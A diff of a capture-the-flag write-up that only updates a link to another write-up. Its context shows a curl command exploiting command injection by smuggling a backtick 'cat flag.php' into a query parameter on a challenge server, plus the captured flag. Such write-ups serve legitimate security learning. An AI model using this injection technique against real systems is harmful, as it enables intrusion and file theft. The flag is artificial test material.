@@ -28,4 +28,4 @@ curl -s 'http://34.107.126.69:30516/?a=lazy&b=titan;`cat%20flag.php|base64+-w0`'
 
 `CTF{2ae4644b1e4cbc1f560c52f3ee0985043d3e0acf0f766851382974646578ec39}`
 
-Note: I had to replace the lowercase ctf with upper case because the flag wasn't originally accepted. All in all this challenge felt lackluster with the most minimum of efforts from the creator. It boggles the mind why this was considered "medium". [sided-curl]() was much more difficult and interesting and with some thought actually put behind it.
+Note: I had to replace the lowercase ctf with upper case because the flag wasn't originally accepted. All in all this challenge felt lackluster with the most minimum of efforts from the creator. It boggles the mind why this was considered "medium". [sided-curl](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Unbreakable-Individual-2024/sided-curl.md) was much more difficult and interesting and with some thought actually put behind it.
